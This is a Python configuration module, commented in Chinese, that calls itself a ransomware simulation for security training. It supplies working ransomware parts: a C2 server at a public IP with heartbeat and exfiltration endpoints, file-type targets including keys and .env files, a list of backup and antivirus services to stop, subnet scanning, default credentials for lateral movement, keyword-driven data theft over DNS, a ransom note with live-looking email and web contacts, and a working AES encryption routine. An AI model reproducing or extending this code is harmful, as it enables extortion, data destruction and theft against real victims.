"""
共享配置模块 - 所有组件共用的配置参数
用于安全培训课堂的勒索病毒行为模拟
"""
import os
import hmac
import hashlib
import base64
import struct
import time
import pyaes

# ============================================================
# 版本与标识
# ============================================================
VERSION = "2.0"
MARKER = "RANSOMSIM_V2"
MARKER_BYTES = MARKER.encode('utf-8')

# ============================================================
# 加密密钥（培训环境固定密钥，真实场景中密钥会由C2下发）
# ============================================================
MASTER_PASSWORD = "RANSOM_SIM_TRAINING_2025_SECURE"
MASTER_PASSWORD_BYTES = MASTER_PASSWORD.encode('utf-8')

# ============================================================
# C2 服务器配置
# ============================================================
C2_HOST = "120.55.69.86"  # 默认C2地址，运行时可通过参数覆盖
C2_PORT = 8443
C2_HEARTBEAT_URL = f"http://{C2_HOST}:{C2_PORT}/api/heartbeat"
C2_EXFIL_URL = f"http://{C2_HOST}:{C2_PORT}/api/exfil"
C2_SCAN_URL = f"http://{C2_HOST}:{C2_PORT}/api/scan_result"
C2_HEARTBEAT_INTERVAL = 30  # 心跳间隔（秒）

# ============================================================
# 加密目标文件扩展名
# ============================================================
TARGET_EXTENSIONS = [
    # 文档类
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf",
    ".txt", ".csv", ".rtf", ".odt", ".ods", ".odp",
    # 图片类
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".psd", ".ai",
    # 压缩包
    ".zip", ".rar", ".7z", ".tar", ".gz",
    # 数据库
    ".sql", ".mdb", ".accdb", ".db", ".sqlite",
    # 代码/配置
    ".cpp", ".py", ".java", ".js", ".json", ".xml", ".yaml", ".yml",
    ".conf", ".cfg", ".ini", ".env", ".pem", ".key",
    # 其他
    ".dwg", ".dxf", ".bak", ".log",
]

# ============================================================
# 排除目录（保护系统稳定性）
# ============================================================
EXCLUDE_DIRS = [
    "Windows", "Program Files", "Program Files (x86)", "ProgramData",
    "$Recycle.Bin", "AppData", "System Volume Information",
    ".git", "node_modules", "__pycache__", "venv", ".venv",
    "RANSOMSIM_MARKER",  # 排除自身标记目录
]

# ============================================================
# 勒索信模板
# ============================================================
RANSOM_NOTE_TEMPLATE = """
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║              !!! YOUR FILES HAVE BEEN ENCRYPTED !!!                   ║
║              !!! 你的文件已经被加密 !!!                                ║
║                                                                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  [事件信息 / Event Info]                                              ║
║                                                                      ║
║    受害者ID / Victim ID : {victim_id}                                 ║
║    加密时间 / Time      : {timestamp}                                 ║
║    加密算法 / Algorithm : AES-256-CBC + RSA-2048                      ║
║    受影响文件 / Files   : {file_count} 个文件已被加密                   ║
║                                                                      ║
║  [支付要求 / Payment Demand]                                          ║
║                                                                      ║
║    赎金金额 : 10 BTC (约 $350,000 USD)                                ║
║    比特币地址 : {bitcoin_address}                                      ║
║    支付时限 : 72 小时                                                  ║
║    超时后果 : 赎金翻倍，7天后删除解密密钥                               ║
║                                                                      ║
║  [联系方式 / Contact]                                                  ║
║                                                                      ║
║    Tor 网址 : https://www.mojue88.com/                        ║
║    邮箱     : mojue688@gmail.com                                 ║
║    备用邮箱 : mojuelove@163.com                                  ║
║                                                                      ║
║  [恢复说明 / Recovery Instructions]                                    ║
║                                                                      ║
║    1. 在72小时内支付赎金到指定比特币地址                                ║
║    2. 发送交易截图到上述邮箱                                           ║
║    3. 等待解密工具和密钥下发                                           ║
║    4. 逾期未支付将永久删除解密密钥                                      ║
║                                                                      ║
║  ⚠️   !!! 你的文件已经被加密 !!!       ⚠️              ║
║       !!! 你的文件已经被加密 !!!                                ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
"""

# ============================================================
# 弹窗配置
# ============================================================
POPUP_CONFIG = {
    "title": "⚠️ SYSTEM LOCKED - 系统已锁定 ⚠️",
    "bg_color": "#1a0000",
    "fg_color": "#ff0000",
    "text_color": "#ffffff",
    "accent_color": "#ffcc00",
    "button_color": "#cc0000",
    "width": 900,
    "height": 700,
    "countdown_hours": 72,
    "decrypt_hint": "三生三世，彼岸花开",
}

# ============================================================
# 行为链配置 - 要停止的服务（模拟勒索病毒停止关键服务）
# ============================================================
SERVICES_TO_STOP = [
    "MSSQLSERVER", "SQLSERVERAGENT",       # 数据库
    "MySQL", "MariaDB", "PostgreSQL",
    "W3SVC", "WAS",                         # Web服务
    "MSExchangeIS", "MSExchangeSA",         # 邮件服务
    "VeeamBackupSvc", "AcronisAgent",       # 备份服务
    "SepMasterService", "McAfeeFramework",  # 安全软件
    "DefWatch", "ccEvtMgr",
]

# ============================================================
# 行为链配置 - 网络扫描参数
# ============================================================
NETWORK_SCAN_CONFIG = {
    "ports_to_scan": [22, 80, 135, 443, 445, 3389, 5985, 5986, 8080],
    "scan_timeout": 0.3,  # 每个端口的连接超时（秒）
    "max_hosts": 254,     # 扫描整个 /24 网段
}

# ============================================================
# 行为链配置 - 横向移动模拟凭据
# ============================================================
LATERAL_CREDS = [
    {"user": "Administrator", "pass": "P@ssw0rd123!"},
    {"user": "admin", "pass": "admin123"},
    {"user": "backup", "pass": "Backup2024!"},
    {"user": "sql_svc", "pass": "SqlService2024"},
]

# ============================================================
# 行为链配置 - 数据外泄模拟
# ============================================================
EXFIL_CONFIG = {
    "doc_extensions": [".docx", ".xlsx", ".pdf", ".txt"],
    "sensitive_keywords": [
        "password", "密码", "secret", "机密", "confidential",
        "private", "key", "token", "credential", "凭据",
    ],
    "max_files_to_exfil": 20,
    "dns_tunnel_domain": "exfil.ransomsim-training.local",
    "dns_query_interval": 0.5,
}

# ============================================================
# MITRE ATT&CK 映射
# ============================================================
MITRE_MAPPING = {
    "T1083": "File and Directory Discovery",
    "T1486": "Data Encrypted for Impact",
    "T1547.001": "Boot/Logon Autostart: Registry Run Keys",
    "T1053.005": "Scheduled Task",
    "T1490": "Inhibit System Recovery",
    "T1562.001": "Disable/Modify Tools",
    "T1552.001": "Credentials In Files",
    "T1003.002": "Security Account Manager",
    "T1046": "Network Service Discovery",
    "T1021.002": "SMB/Windows Admin Shares",
    "T1021.001": "Remote Desktop Protocol",
    "T1021.003": "Distributed Component Object Model",
    "T1560.001": "Archive Collected Data",
    "T1048.003": "Exfiltration Over Unencrypted Non-C2 Protocol",
    "T1071.004": "DNS",
    "T1491.001": "Internal Defacement",
    "T1489": "Service Stop",
}

# ============================================================
# 工具函数
# ============================================================

def generate_victim_id() -> str:
    """生成受害者唯一标识（含随机数防碰撞）"""
    import platform
    import time
    import random
    raw = f"{platform.node()}-{time.time()}-{random.randint(0, 999999)}"
    return hashlib.md5(raw.encode()).hexdigest()[:16].upper()


def encode_payload(data: dict) -> bytes:
    """将 dict JSON序列化后做 base64 编码，用于C2通信"""
    import json
    import base64
    json_bytes = json.dumps(data, ensure_ascii=False).encode('utf-8')
    return base64.b64encode(json_bytes)


def decode_payload(raw: bytes) -> dict:
    """将 base64 编码的 payload 解码为 dict"""
    import json
    import base64
    json_bytes = base64.b64decode(raw)
    return json.loads(json_bytes.decode('utf-8'))


def generate_decrypt_key(victim_id: str) -> str:
    """从受害者ID生成解密密钥（每台主机唯一）"""
    return hashlib.sha256(
        f"{MASTER_PASSWORD}-{victim_id}".encode()
    ).hexdigest()[:32].upper()


class _Fernet:
    """纯 Python Fernet 实现（AES-256-CBC + HMAC-SHA256）

    接口兼容 cryptography.fernet.Fernet：encrypt(data) / decrypt(token)
    格式标准：version(1B) + timestamp(8B) + IV(16B) + ciphertext + HMAC(32B)
    """

    def __init__(self, key: bytes):
        """key: 32 字节原始密钥或 urlsafe_b64 编码的 44 字节密钥"""
        if len(key) == 44 and key.endswith(b'='):
            key = base64.urlsafe_b64decode(key)
        if len(key) != 32:
            raise ValueError("Fernet key must be 32 bytes")
        self._signing_key = key[:16]
        self._encryption_key = key[16:]

    def encrypt(self, data: bytes) -> bytes:
        iv = os.urandom(16)
        # PKCS7 填充
        pad_len = 16 - (len(data) % 16)
        padded = data + bytes([pad_len] * pad_len)
        # AES-256-CBC 加密
        aes = pyaes.AESModeOfOperationCBC(self._encryption_key, iv=iv)
        ciphertext = b''.join(aes.encrypt(padded[i:i+16]) for i in range(0, len(padded), 16))
        # 组装：version + timestamp + IV + ciphertext
        ts = int(time.time())
        payload = b'\x80' + struct.pack('>Q', ts) + iv + ciphertext
        # HMAC-SHA256 签名
        sig = hmac.new(self._signing_key, payload, hashlib.sha256).digest()
        return base64.urlsafe_b64encode(payload + sig)

    def decrypt(self, token: bytes) -> bytes:
        decoded = base64.urlsafe_b64decode(token)
        if len(decoded) < 57:
            raise ValueError("Invalid Fernet token")
        if decoded[0] != 0x80:
            raise ValueError("Invalid Fernet version")
        # 验证 HMAC
        payload = decoded[:-32]
        sig = decoded[-32:]
        expected = hmac.new(self._signing_key, payload, hashlib.sha256).digest()
        if not hmac.compare_digest(sig, expected):
            raise ValueError("Invalid Fernet signature")
        # 提取 IV 和密文
        iv = payload[9:25]
        ciphertext = payload[25:]
        # AES-256-CBC 解密
        aes = pyaes.AESModeOfOperationCBC(self._encryption_key, iv=iv)
        decrypted = b''.join(aes.decrypt(ciphertext[i:i+16]) for i in range(0, len(ciphertext), 16))
        # PKCS7 去填充
        pad_len = decrypted[-1]
        if pad_len < 1 or pad_len > 16:
            raise ValueError("Invalid padding")
        return decrypted[:-pad_len]


def derive_fernet_key(salt: bytes, victim_id: str = None, decrypt_key: str = None) -> _Fernet:
    """从密钥材料派生 Fernet 密钥

    如果提供了 victim_id + decrypt_key，则使用它们派生（每台主机不同）
    否则使用全局 MASTER_PASSWORD（兼容旧逻辑）
    """
    if victim_id and decrypt_key:
        password = f"{decrypt_key}-{victim_id}".encode()
    else:
        password = MASTER_PASSWORD_BYTES
    key = hashlib.pbkdf2_hmac('sha256', password, salt, 100000, dklen=32)
    return _Fernet(key)


def generate_file_salt() -> bytes:
    """为每个文件生成随机盐值"""
    return os.urandom(16)




def get_ransom_note(victim_id: str, file_count: int) -> str:
    """生成完整的勒索信内容（不含密钥，密钥仅存C2）"""
    import datetime
    return RANSOM_NOTE_TEMPLATE.format(
        victim_id=victim_id,
        timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        file_count=file_count,
        bitcoin_address="bc1q" + hashlib.md5(victim_id.encode()).hexdigest()[:32],
        onion_address=hashlib.md5(victim_id.encode()).hexdigest()[:16],
    )